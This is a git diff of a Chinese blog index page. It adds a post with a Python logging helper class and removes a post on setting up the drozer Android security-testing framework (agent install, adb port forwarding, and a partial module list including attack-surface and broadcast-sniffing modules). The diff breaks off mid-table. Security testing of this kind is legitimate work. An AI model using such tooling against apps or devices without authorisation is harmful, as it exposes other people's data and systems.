@@ -191,6 +191,113 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://louis-me.github.io/aposts/3fc2b160/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="一个正经的测试工程师">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="施坤的博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/aposts/3fc2b160/" class="post-title-link" itemprop="url">python之logging</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-08-02 16:38:35 / 修改时间：19:35:03" itemprop="dateCreated datePublished" datetime="2022-08-02T16:38:35+08:00">2022-08-02</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/python/" itemprop="url" rel="index"><span itemprop="name">python</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/aposts/3fc2b160/" class="post-meta-item leancloud_visitors" data-flag-title="python之logging" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/aposts/3fc2b160/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/aposts/3fc2b160/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">------------------------------------</span><br><span class="line"># @FileName    :handle_log.py</span><br><span class="line"># @Time        :2020/8/31 19:59</span><br><span class="line"># @Author      :xieyuanzuo</span><br><span class="line"># @description :</span><br><span class="line">------------------------------------</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">import logging</span><br><span class="line">import os</span><br><span class="line">import colorlog</span><br><span class="line">from logging.handlers import RotatingFileHandler</span><br><span class="line">from datetime import datetime</span><br><span class="line"></span><br><span class="line">cur_path = os.path.dirname(os.path.realpath(__file__))  # 当前项目路径</span><br><span class="line">log_path = os.path.join(os.path.dirname(cur_path), &#x27;leetcode&#x27;, &#x27;logs&#x27;)  # log_path为存放日志的路径</span><br><span class="line">if not os.path.exists(log_path): os.mkdir(log_path)  # 若不存在logs文件夹，则自动创建</span><br><span class="line"></span><br><span class="line">log_colors_config = &#123;</span><br><span class="line">    # 终端输出日志颜色配置</span><br><span class="line">    &#x27;DEBUG&#x27;: &#x27;white&#x27;,</span><br><span class="line">    &#x27;INFO&#x27;: &#x27;cyan&#x27;,</span><br><span class="line">    &#x27;WARNING&#x27;: &#x27;yellow&#x27;,</span><br><span class="line">    &#x27;ERROR&#x27;: &#x27;red&#x27;,</span><br><span class="line">    &#x27;CRITICAL&#x27;: &#x27;bold_red&#x27;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">default_formats = &#123;</span><br><span class="line">    # 终端输出格式</span><br><span class="line">    &#x27;color_format&#x27;: &#x27;%(log_color)s%(asctime)s-%(name)s-%(filename)s-[line:%(lineno)d]-%(levelname)s: %(message)s&#x27;,</span><br><span class="line">    # 日志输出格式</span><br><span class="line">    &#x27;log_format&#x27;: &#x27;%(asctime)s-%(name)s-%(filename)s-[line:%(lineno)d]-%(levelname)s: %(message)s&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class HandleLog:</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    先创建日志记录器（logging.getLogger），然后再设置日志级别（logger.setLevel），</span><br><span class="line">    接着再创建日志文件，也就是日志保存的地方（logging.FileHandler），然后再设置日志格式（logging.Formatter），</span><br><span class="line">    最后再将日志处理程序记录到记录器（addHandler）</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    def __init__(self):</span><br><span class="line">        self.__now_time = datetime.now().strftime(&#x27;%Y-%m-%d&#x27;)  # 当前日期格式化</span><br><span class="line">        self.__all_log_path = os.path.join(log_path, self.__now_time + &quot;-all&quot; + &quot;.log&quot;)  # 收集所有日志信息文件</span><br><span class="line">        self.__error_log_path = os.path.join(log_path, self.__now_time + &quot;-error&quot; + &quot;.log&quot;)  # 收集错误日志信息文件</span><br><span class="line">        self.__logger = logging.getLogger()  # 创建日志记录器</span><br><span class="line">        self.__logger.setLevel(logging.DEBUG)  # 设置默认日志记录器记录级别</span><br><span class="line"></span><br><span class="line">    @staticmethod</span><br><span class="line">    def __init_logger_handler(log_path):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        创建日志记录器handler，用于收集日志</span><br><span class="line">        :param log_path: 日志文件路径</span><br><span class="line">        :return: 日志记录器</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        # 写入文件，如果文件超过1M大小时，切割日志文件，仅保留3个文件</span><br><span class="line">        logger_handler = RotatingFileHandler(filename=log_path, maxBytes=1 * 1024 * 1024, backupCount=3, encoding=&#x27;utf-8&#x27;)</span><br><span class="line">        return logger_handler</span><br><span class="line"></span><br><span class="line">    @staticmethod</span><br><span class="line">    def __init_console_handle():</span><br><span class="line">        &quot;&quot;&quot;创建终端日志记录器handler，用于输出到控制台&quot;&quot;&quot;</span><br><span class="line">        console_handle = colorlog.StreamHandler()</span><br><span class="line">        return console_handle</span><br><span class="line"></span><br><span class="line">    def __set_log_handler(self, logger_handler, level=logging.DEBUG):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        设置handler级别并添加到logger收集器</span><br><span class="line">        :param logger_handler: 日志记录器</span><br><span class="line">        :param level: 日志记录器级别</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        logger_handler.setLevel(level=level)</span><br><span class="line">        self.__logger.addHandler(logger_handler)</span><br><span class="line"></span><br><span class="line">    def __set_color_handle(self, console_handle):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        设置handler级别并添加到终端logger收集器</span><br><span class="line">        :param console_handle: 终端日志记录器</span><br><span class="line">        :param level: 日志记录器级别</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        console_handle.setLevel(logging.DEBUG)</span><br><span class="line">        self.__logger.addHandler(console_handle)</span><br><span class="line"></span><br><span class="line">    @staticmethod</span><br><span class="line">    def __set_color_formatter(console_handle, color_config):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        设置输出格式-控制台</span><br><span class="line">        :param console_handle: 终端日志记录器</span><br><span class="line">        :param color_config: 控制台打印颜色配置信息</span><br><span class="line">        :return:</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        formatter = colorlog.ColoredFormatter(default_formats[&quot;color_format&quot;], log_colors=color_config)</span><br><span class="line">        console_handle.setFormatter(formatter)</span><br><span class="line"></span><br><span class="line">    @staticmethod</span><br><span class="line">    def __set_log_formatter(file_handler):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        设置日志输出格式-日志文件</span><br><span class="line">        :param file_handler: 日志记录器</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        formatter = logging.Formatter(default_formats[&quot;log_format&quot;], datefmt=&#x27;%Y-%m-%d %H:%M:%S&#x27;)</span><br><span class="line">        file_handler.setFormatter(formatter)</span><br><span class="line"></span><br><span class="line">    @staticmethod</span><br><span class="line">    def __close_handler(file_handler):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        关闭handler</span><br><span class="line">        :param file_handler: 日志记录器</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        file_handler.close()</span><br><span class="line"></span><br><span class="line">    def __console(self, level, message):</span><br><span class="line">        &quot;&quot;&quot;构造日志收集器&quot;&quot;&quot;</span><br><span class="line">        all_logger_handler = self.__init_logger_handler(self.__all_log_path)  # 创建日志文件</span><br><span class="line">        error_logger_handler = self.__init_logger_handler(self.__error_log_path)</span><br><span class="line">        console_handle = self.__init_console_handle()</span><br><span class="line"></span><br><span class="line">        self.__set_log_formatter(all_logger_handler)  # 设置日志格式</span><br><span class="line">        self.__set_log_formatter(error_logger_handler)</span><br><span class="line">        self.__set_color_formatter(console_handle, log_colors_config)</span><br><span class="line"></span><br><span class="line">        self.__set_log_handler(all_logger_handler)  # 设置handler级别并添加到logger收集器</span><br><span class="line">        self.__set_log_handler(error_logger_handler, level=logging.ERROR)</span><br><span class="line">        self.__set_color_handle(console_handle)</span><br><span class="line"></span><br><span class="line">        if level == &#x27;info&#x27;:</span><br><span class="line">            self.__logger.info(message)</span><br><span class="line">        elif level == &#x27;debug&#x27;:</span><br><span class="line">            self.__logger.debug(message)</span><br><span class="line">        elif level == &#x27;warning&#x27;:</span><br><span class="line">            self.__logger.warning(message)</span><br><span class="line">        elif level == &#x27;error&#x27;:</span><br><span class="line">            self.__logger.error(message)</span><br><span class="line">        elif level == &#x27;critical&#x27;:</span><br><span class="line">            self.__logger.critical(message)</span><br><span class="line"></span><br><span class="line">        self.__logger.removeHandler(all_logger_handler)  # 避免日志输出重复问题</span><br><span class="line">        self.__logger.removeHandler(error_logger_handler)</span><br><span class="line">        self.__logger.removeHandler(console_handle)</span><br><span class="line"></span><br><span class="line">        self.__close_handler(all_logger_handler)  # 关闭handler</span><br><span class="line">        self.__close_handler(error_logger_handler)</span><br><span class="line"></span><br><span class="line">    def debug(self, message):</span><br><span class="line">        self.__console(&#x27;debug&#x27;, message)</span><br><span class="line"></span><br><span class="line">    def info(self, message):</span><br><span class="line">        self.__console(&#x27;info&#x27;, message)</span><br><span class="line"></span><br><span class="line">    def warning(self, message):</span><br><span class="line">        self.__console(&#x27;warning&#x27;, message)</span><br><span class="line"></span><br><span class="line">    def error(self, message):</span><br><span class="line">        self.__console(&#x27;error&#x27;, message)</span><br><span class="line"></span><br><span class="line">    def critical(self, message):</span><br><span class="line">        self.__console(&#x27;critical&#x27;, message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">log = HandleLog()</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    for i in range(5):</span><br><span class="line">        log.info(&quot;这是日志信息&quot;)</span><br><span class="line">        log.debug(&quot;这是debug信息&quot;)</span><br><span class="line">        log.warning(&quot;这是警告信息&quot;)</span><br><span class="line">        log.error(&quot;这是错误日志信息&quot;)</span><br><span class="line">        log.critical(&quot;这是严重级别信息&quot;)</span><br></pre></td></tr></table></figure>
+
+<h2 id="结果分析"><a href="#结果分析" class="headerlink" title="结果分析"></a>结果分析</h2><ul>
+<li>在Logs文件夹下生成了一个为全部日志文件，一个为错误日志文件</li>
+</ul>
+<p><img src="/aposts/3fc2b160/image-20220802192813131.png" alt="image-20220802192813131"></p>
+<ul>
+<li>日志文件的生成核心代码如下，可根据需求修改</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">__console</span>(<span class="params">self, level, message</span>):</span><br><span class="line">      <span class="string">&quot;&quot;&quot;构造日志收集器&quot;&quot;&quot;</span></span><br><span class="line">      all_logger_handler = self.__init_logger_handler(self.__all_log_path)  <span class="comment"># 创建日志文件</span></span><br><span class="line">      error_logger_handler = self.__init_logger_handler(self.__error_log_path)</span><br><span class="line">      console_handle = self.__init_console_handle()</span><br><span class="line"></span><br><span class="line">      self.__set_log_formatter(all_logger_handler)  <span class="comment"># 设置日志格式</span></span><br><span class="line">      self.__set_log_formatter(error_logger_handler)</span><br><span class="line">      self.__set_color_formatter(console_handle, log_colors_config)</span><br><span class="line"></span><br><span class="line">      self.__set_log_handler(all_logger_handler)  <span class="comment"># 设置handler级别并添加到logger收集器--all的Log文件</span></span><br><span class="line">      self.__set_log_handler(error_logger_handler, level=logging.ERROR) <span class="comment">#--error的log文件</span></span><br><span class="line">      self.__set_color_handle(console_handle)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>注意这里设置了日志文件大小</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init_logger_handler</span>(<span class="params">log_path</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        创建日志记录器handler，用于收集日志</span></span><br><span class="line"><span class="string">        :param log_path: 日志文件路径</span></span><br><span class="line"><span class="string">        :return: 日志记录器</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment"># 写入文件，如果文件超过1M大小时，切割日志文件，仅保留3个文件</span></span><br><span class="line">        logger_handler = RotatingFileHandler(filename=log_path, maxBytes=<span class="number">1</span> * <span class="number">1024</span> * <span class="number">1024</span>, backupCount=<span class="number">3</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> logger_handler</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>本次代码来自<a target="_blank" rel="noopener" href="https://www.cnblogs.com/xyztank/articles/13599165.html">这里</a></li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://louis-me.github.io/aposts/af1b4933/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1392,444 +1499,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://louis-me.github.io/aposts/2b1c1b8c/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="">
-      <meta itemprop="description" content="一个正经的测试工程师">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="施坤的博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/aposts/2b1c1b8c/" class="post-title-link" itemprop="url">Drozer实践</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-04-06 16:39:18" itemprop="dateCreated datePublished" datetime="2022-04-06T16:39:18+08:00">2022-04-06</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-04-08 20:55:06" itemprop="dateModified" datetime="2022-04-08T20:55:06+08:00">2022-04-08</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/app%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">app安全测试</span></a>
-                </span>
-            </span>
-
-          
-            <span id="/aposts/2b1c1b8c/" class="post-meta-item leancloud_visitors" data-flag-title="Drozer实践" title="阅读次数">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-eye"></i>
-              </span>
-              <span class="post-meta-item-text">阅读次数：</span>
-              <span class="leancloud-visitors-count"></span>
-            </span>
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Valine：</span>
-    
-    <a title="valine" href="/aposts/2b1c1b8c/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/aposts/2b1c1b8c/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p><code>drozer</code>是一款针对<code>Android</code>系统的安全测试框架，可以分成两个部分：其一是<code>console</code>，它运行在本地计算机上；其二是<code>server</code>，它是一个安装在目标<code>Android</code>设备上的<code>app</code>，当使用<code>console</code>与<code>Android</code>设备交互时，就是把<code>Java</code>代码输入到运行在实际设备上的<code>drozer</code>代理(<code>agent</code>)中。</p>
-<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><ul>
-<li>本地电脑安装<code>jdk1.7</code></li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Admin&gt;java --version</span><br><span class="line">java 17.0.2 2022-01-18 LTS</span><br><span class="line">Java(TM) SE Runtime Environment (build 17.0.2+8-LTS-86)</span><br><span class="line">Java HotSpot(TM) 64-Bit Server VM (build 17.0.2+8-LTS-86, mixed mode, sharing)</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>本地电脑装<code>adb</code></li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Admin&gt;adb --version</span><br><span class="line">Android Debug Bridge version 1.0.40</span><br><span class="line">Version 4986621</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>本地python的版本，记得配置好环境变量</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Admin&gt;python --version</span><br><span class="line">Python 2.7.15</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>下载<code>drozer-2.4.4.win32.msi</code><a target="_blank" rel="noopener" href="https://github.com/mwrlabs/drozer">最新版本</a></li>
-</ul>
-<p><img src="/aposts/2b1c1b8c/image-20220407085705247.png" alt="image-20220407085705247"></p>
-<ul>
-<li>在<code>python2.7</code>的<code>script</code>目录可以看到安装的<code>drozer</code></li>
-</ul>
-<p><img src="/aposts/2b1c1b8c/image-20220407085922571.png" alt="image-20220407085922571"></p>
-<ul>
-<li>下载<a target="_blank" rel="noopener" href="https://github.com/mwrlabs/drozer/releases/download/2.3.4/drozer-agent-2.3.4.apk">drozer-agent-2.3.4.apk</a>安装包，安装到模拟器中(雷电)</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Admin&gt;adb devices</span><br><span class="line">List of devices attached</span><br><span class="line">* daemon not running; starting now at tcp:5037</span><br><span class="line">* daemon started successfully</span><br><span class="line">emulator-5554   device</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Users\Admin&gt;adb install d:\appsafetest\drozer-agent-2.3.4.apk</span><br><span class="line">Success</span><br></pre></td></tr></table></figure>
-
-<p><img src="/aposts/2b1c1b8c/image-20220407090727709.png" alt="image-20220407090727709"></p>
-<ul>
-<li>模拟器中启动server</li>
-</ul>
-<p><img src="/aposts/2b1c1b8c/image-20220407093534775.png" alt="image-20220407093534775"></p>
-<ul>
-<li>安装依赖文件</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">python -m pip install --upgrade pip</span><br><span class="line">pip install pyyaml</span><br><span class="line">pip install protobuf==3.17.3 # 一定要这个版本，用最新的版本无法启动drozer</span><br><span class="line">pip install pyOpenSSL</span><br><span class="line">pip install twisted</span><br><span class="line">pip install service_identity</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>使用 <code>adb </code>进行端口转发，转发到上边<code>Drozer</code>使用的端口 <code>31415</code></li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb forward tcp:31415 tcp:31415</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>测试是否可以启动<code>drozer</code><ul>
-<li>一定要用<code>cd</code>进入到<code>drozer</code>的安装目录（<code>D:\app\Python27\Scripts</code>），不然<code>drozer</code>不能正常使用</li>
-<li>然后执行<code>drozer.bat console connect</code>连接<code>drozer</code>的<code>server</code></li>
-</ul>
-</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">cd D:\app\Python27\Scripts</span><br><span class="line"></span><br><span class="line">D:\app\Python27\Scripts&gt;drozer.bat console connect</span><br><span class="line"></span><br><span class="line">            ..                    ..:.</span><br><span class="line">           ..o..                  .r..</span><br><span class="line">            ..a..  . ....... .  ..nd</span><br><span class="line">              ro..idsnemesisand..pr</span><br><span class="line">              .otectorandroidsneme.</span><br><span class="line">           .,sisandprotectorandroids+.</span><br><span class="line">         ..nemesisandprotectorandroidsn:.</span><br><span class="line">        .emesisandprotectorandroidsnemes..</span><br><span class="line">      ..isandp,..,rotectorandro,..,idsnem.</span><br><span class="line">      .isisandp..rotectorandroid..snemisis.</span><br><span class="line">      ,andprotectorandroidsnemisisandprotec.</span><br><span class="line">     .torandroidsnemesisandprotectorandroid.</span><br><span class="line">     .snemisisandprotectorandroidsnemesisan:</span><br><span class="line">     .dprotectorandroidsnemesisandprotector.</span><br><span class="line"></span><br><span class="line">drozer Console (v2.4.4)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>查看下<code>drozer</code>的模块列表</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; list</span><br><span class="line">app.activity.forintent                   Find activities that can handle the given intent</span><br><span class="line">app.activity.info                        Gets information about exported activities.</span><br><span class="line">app.activity.start                       Start an Activity</span><br><span class="line">app.broadcast.info                       Get information about broadcast receivers</span><br><span class="line">app.broadcast.send                       Send broadcast using an intent</span><br><span class="line">app.broadcast.sniff                      Register a broadcast receiver that can sniff particular intents</span><br><span class="line">app.package.attacksurface                Get attack surface of package</span><br><span class="line">app.package.backup                       Lists packages that use the backup API (returns true on FLAG_ALLOW_BACKUP)</span><br><span class="line">app.package.debuggable                   Find debuggable packages</span><br><span class="line">.....</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>常用模块</li>
-</ul>
-<table>
-<thead>
-<tr>
-<th>模块名</th>
-<th>作用</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>app.activity.forintent</td>
-<td>通过intent查找它的activity</td>
-</tr>
-<tr>
-<td>app.activity.info</td>
-<td>获取activities信息</td>
-</tr>
-<tr>
-<td>app.activity.start</td>
-<td>开启 Activity</td>
-</tr>
-<tr>
-<td>app.broadcast.info</td>
-<td>获取broadcast receivers信息</td>
-</tr>
-<tr>
-<td>app.broadcast.send</td>
-<td>发送广播</td>
-</tr>
-<tr>
-<td>app.broadcast.sniff</td>
-<td>嗅探广播中intent的数据</td>
-</tr>
-<tr>
-<td>app.package.attacksurface</td>
-<td>确定安装包的可攻击面</td>
-</tr>
-<tr>
-<td>app.package.backup</td>
-<td>列出可备份的包</td>
-</tr>
-<tr>
-<td>app.package.debuggable</td>
-<td>列出可debug的包</td>
-</tr>
-<tr>
-<td>app.package.info</td>
-<td>获取已安装包的信息</td>
-</tr>
-<tr>
-<td>app.package.launchintent</td>
